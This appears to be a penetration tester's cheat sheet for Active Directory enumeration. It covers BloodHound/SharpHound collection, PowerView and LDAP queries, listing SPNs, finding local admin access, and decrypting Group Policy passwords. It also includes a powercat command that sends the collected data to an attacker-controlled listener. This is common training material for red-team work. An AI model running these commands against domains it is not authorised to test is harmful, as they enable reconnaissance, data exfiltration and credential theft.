## Active Directory

### Automatic Enumeration

To make use of Bloodhound to enumerate an AD from the current user context run:
```powershell
Import-Module .\Sharphound.ps1
```
```powershell
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "domain-audit"
```
Get the file back to Kali with Powercat:
```bash
nc -nlvp 4444 > bloodhound.zip
```
```powershell
Import-Module .\powercat.ps1
```
```powershell
powercat -c 192.168.45.xx -p 4444 -i bloodhound.zip
```
The resulting ZIP can be analysed in Neo4J (default creds `neo4j:neo4j`):
```bash
sudo neo4j start
```
Then start Bloodhound locally, login with our Neo4J creds, and upload the zip we generated on the Windows machine:
```bash
bloodhound
```
One neat custom query to pop into Neo4J to see which users have a session on which machines:
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

### Manual Enumeration

Login as a user on a domain:
```bash
xfreerdp /u:ggilligan12 /d:vulnerable.corp /v:192.168.12.34
```
Get users on the domain:
```cmd
net user /domain
```
Enumerate particular domain user:
```cmd
net user ggilligan12 /domain
```
Enumerate groups on the domain:
```cmd
net group /domain
```
Enumerate particular domain group:
```cmd
net group "uberPwnage" /domain
```
Get domain info via Powershell:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
```
Get the primary domain controller (PDC):
```powershell
$PDC = $domainObj.PdcRoleOwner.Name
```
Get LDAP path formatted domain:
```powershell
([adsi]'').distinguishedName
```
Combine the above and `FindAll()` to get every directory in the AD:
```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.FindAll()
```

Extending this further still, the following will enumerate all users in the domain:
```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368" # for users (or 268435456 for groups)
$result = $dirsearcher.FindAll()
Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```

For a cleaner set of cmdlets to query the AD with we can import `PowerView`:
```powershell
Import-Module .\PowerView.ps1
```
For basic info about the domain:
```powershell
Get-NetDomain
```
For basic info about users:
```powershell
Get-NetUser
```
and for just the names of users:
```powershell
Get-NetUser | select cn
```
Intuitively enough, for groups:
```powershell
Get-NetGroup
```
For machines, guess what?
```powershell
Get-NetComputer
```
Find which (if any) machines the current user context has local admin on:
```powershell
Find-LocalAdminAccess
```
Find users logged into machines (nb. dubiously reliable):
```powershell
Get-NetSession -ComputerName <machine name> -Verbose
```
Should that fail an alternative that plies a different approach:
```powershell
.\PsLoggedon.exe \\<machine name>
```
Enumerate SPNs (services and the service accounts they are uniquely affiliated with):
```powershell
setspn -L <service name>
```
Or equally valid if we have PowerView to hand:
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```
Get a users ACEs:
```powershell
Get-ObjectAcl -Identity <user of interest>
```
Decode SIDs:
```powershell
Convert-SidToName <security identifier of interest>
```
How're we gonna find Domain Shares? All together now:
```powershell
Find-DomainShare
```
Decrypt a password found embedded in a policy XML:
```powershell
gpp-decrypt "<encrypted password>"
```
